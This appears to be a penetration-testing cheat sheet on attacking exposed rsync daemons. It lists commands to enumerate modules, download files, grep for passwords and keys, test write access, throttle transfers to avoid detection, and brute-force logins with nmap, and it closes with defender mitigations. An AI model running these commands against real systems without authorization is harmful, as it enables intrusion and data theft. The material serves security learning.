Tags: [[rsync]] [[Penetration Testing]] [[Cybersecurity]]
### **Basic Information About `rsync`**

- **Purpose**: Synchronizes files and directories between systems (local or remote).
- **Common Ports**: Runs on TCP port 873 by default but can operate over SSH.
- **Misconfiguration Risk**: If an `rsync` daemon is misconfigured, it might allow unauthorized access to files or directories.

---

### **Checking for an Exposed `rsync` Daemon**

1. **Scan for an Open `rsync` Port (873)**:
   Use tools like `nmap`:
   ```bash
   nmap -p 873 --script rsync-brute <target>
   ```

2. **Check for Anonymous Access**:
   ```bash
   rsync <target>:: 
   ```
   This lists modules (shared directories) if anonymous access is enabled.

---

### **Common `rsync` Commands**

#### **Enumerate Shared Modules**
- List available directories (modules) on the remote server:
  ```bash
  rsync <target>:: 
  ```
  Example output:
  ```
  public_files    Publicly shared files
  backup          Backup files
  ```

#### **Retrieve Files from an Accessible Module**
- Sync files from a remote module to your local system:
  ```bash
  rsync -av <target>::<module> ./local_directory
  ```
  Example:
  ```bash
  rsync -av example.com::public_files ./public_files
  ```

#### **Check What Files Are Accessible Without Downloading**
- Perform a dry run to preview files:
  ```bash
  rsync -anv <target>::<module>
  ```

---

### **Over SSH (if `rsync` is configured to use SSH)**

#### **List Remote Files**
- Access files over SSH:
  ```bash
  rsync -avz -e ssh user@<target>:<remote_directory> ./local_directory
  ```

#### **Copy Files from Remote to Local**
- Download files:
  ```bash
  rsync -avz -e ssh user@<target>:<remote_directory> ./local_directory
  ```

#### **Copy Files from Local to Remote**
- Upload files:
  ```bash
  rsync -avz -e ssh ./local_directory user@<target>:<remote_directory>
  ```

---

### **Enumeration and Exploitation**

#### **Discover Sensitive Data**
- If you have access to a module, search for sensitive files (e.g., passwords, keys):
  ```bash
  rsync -av <target>::<module> | grep -iE "(password|secret|config|key)"
  ```

#### **Check for Write Access**
- Test if you can upload files (indicating misconfiguration):
  ```bash
  rsync -av ./test_file <target>::<module>
  ```

#### **Copy Hidden Files**
- Include hidden files when syncing:
  ```bash
  rsync -av --include=".*" <target>::<module> ./local_directory
  ```

---

### **Advanced Options**

#### **Bandwidth Limiting**
- To avoid detection, limit the transfer speed:
  ```bash
  rsync --bwlimit=50 -av <target>::<module> ./local_directory
  ```

#### **Compression**
- Speed up transfers over slow connections:
  ```bash
  rsync -avz <target>::<module> ./local_directory
  ```

#### **Exclude Files**
- Avoid downloading unnecessary files:
  ```bash
  rsync -av --exclude "*.log" <target>::<module> ./local_directory
  ```

#### **Sync Only Specific Files**
- Download only files of interest (e.g., `.conf` files):
  ```bash
  rsync -av --include="*.conf" --exclude="*" <target>::<module> ./local_directory
  ```

---

### **Useful Tools for `rsync` Enumeration**

1. **`rsync-brute` (Nmap Script)**:
   Perform brute force attacks on `rsync` authentication:
   ```bash
   nmap -p 873 --script rsync-brute --script-args userdb=users.txt,passdb=pass.txt <target>
   ```

2. **Custom Scripts**:
   Automate enumeration with a custom script to test for accessible files.

---

### **Mitigation Tips for Defenders**
- Disable anonymous access unless necessary.
- Restrict access to specific IPs using `hosts.allow` and `hosts.deny`.
- Enable authentication for all modules.
- Use SSH for secure transfers.
- Review exposed modules for sensitive data.


# Commands

Here’s a curated list of **`rsync` commands** you can use during a penetration test to explore, exploit, and interact with a misconfigured or exposed `rsync` service. These commands focus on enumeration, file retrieval, and testing access.

---

### **Basic Commands for Enumeration**

1. **List Available Modules**
   - Enumerate shared directories (modules) exposed by the `rsync` daemon:
     ```bash
     rsync rsync://<target_ip>/
     ```
   - Example:
     ```bash
     rsync rsync://10.10.10.10/
     ```

2. **Detailed Module Information**
   - Add the `-v` (verbose) flag to get additional details about each module:
     ```bash
     rsync -v rsync://<target_ip>/
     ```

---

### **Downloading Files and Directories**

3. **Download an Entire Module**
   - Sync the files in a specific module to your local system:
     ```bash
     rsync -av rsync://<target_ip>/<module_name> ./local_directory
     ```
   - Example:
     ```bash
     rsync -av rsync://10.10.10.10/public ./public_files
     ```

4. **Dry Run to Preview Files**
   - Perform a dry run to see what files are accessible without downloading them:
     ```bash
     rsync -anv rsync://<target_ip>/<module_name>
     ```

5. **Sync Specific File Types**
   - Download files matching a specific pattern (e.g., `.conf` files):
     ```bash
     rsync -av --include="*.conf" --exclude="*" rsync://<target_ip>/<module_name> ./local_directory
     ```

6. **Sync Hidden Files**
   - Include hidden files (those starting with a dot):
     ```bash
     rsync -av --include=".*" rsync://<target_ip>/<module_name> ./local_directory
     ```

---

### **Testing Write Access**

7. **Test Writing a File**
   - Attempt to upload a test file to see if the module allows write access:
     ```bash
     echo "Test File" > test.txt
     rsync -av ./test.txt rsync://<target_ip>/<module_name>
     ```

8. **Sync Local Files to Remote**
   - If write access is allowed, try syncing a directory to the remote system:
     ```bash
     rsync -av ./local_directory/ rsync://<target_ip>/<module_name>
     ```

---

### **Advanced Usage**

9. **Exclude Specific Files or Directories**
   - Skip certain files or directories when syncing:
     ```bash
     rsync -av --exclude="*.log" rsync://<target_ip>/<module_name> ./local_directory
     ```

10. **Limit Bandwidth**
    - Throttle bandwidth to avoid detection during large transfers:
      ```bash
      rsync --bwlimit=50 -av rsync://<target_ip>/<module_name> ./local_directory
      ```

11. **Enable Compression**
    - Compress files during transfer for faster syncing over slow networks:
      ```bash
      rsync -avz rsync://<target_ip>/<module_name> ./local_directory
      ```

12. **Show Progress of Transfer**
    - Monitor the transfer progress of files:
      ```bash
      rsync -av --progress rsync://<target_ip>/<module_name> ./local_directory
      ```

---

### **Over SSH**

13. **List Remote Files Over SSH**
    - Use `rsync` with SSH to access files:
      ```bash
      rsync -avz -e ssh <user>@<target_ip>:/path/to/files ./local_directory
      ```

14. **Download Files Over SSH**
    - Retrieve files securely:
      ```bash
      rsync -avz -e ssh <user>@<target_ip>:/path/to/files ./local_directory
      ```

15. **Upload Files Over SSH**
    - Send files to the remote host:
      ```bash
      rsync -avz -e ssh ./local_directory <user>@<target_ip>:/path/to/files
      ```

---

### **Defensive Enumeration**

16. **Search for Sensitive Files**
    - Look for files that might contain sensitive data (e.g., credentials or keys):
      ```bash
      rsync -av rsync://<target_ip>/<module_name> | grep -iE "password|secret|config|key"
      ```

17. **Discover Large Files**
    - Identify large files of interest (e.g., backups or database dumps):
      ```bash
      rsync -av --progress rsync://<target_ip>/<module_name> | grep -iE "backup|db"
      ```

18. **Check for Backup Files**
    - Look for `.bak` or `.tar.gz` files:
      ```bash
      rsync -av rsync://<target_ip>/<module_name> | grep -iE "\.bak|\.tar\.gz"
      ```

---

### **Automation and Tools**

19. **Automate Enumeration**
    - Write a simple script to iterate over potential modules:
      ```bash
      for module in $(rsync rsync://<target_ip>/ | cut -d ' ' -f1); do
          echo "Checking module: $module"
          rsync -anv rsync://<target_ip>/$module
      done
      ```

20. **Brute-Force Authentication**
    - Use Nmap’s `rsync-brute` script to test for weak credentials:
      ```bash
      nmap -p 873 --script rsync-brute --script-args userdb=users.txt,passdb=pass.txt <target_ip>
      ```

---

### **Mitigation Steps for Defenders**
- Disable anonymous access for `rsync` modules.
- Use `hosts.allow` and `hosts.deny` to restrict access to trusted IPs.
- Require authentication for all modules.
- Encrypt transfers using SSH or similar methods.
- Regularly audit exposed modules for sensitive data.

---

Let me know if you'd like further explanations or additional examples!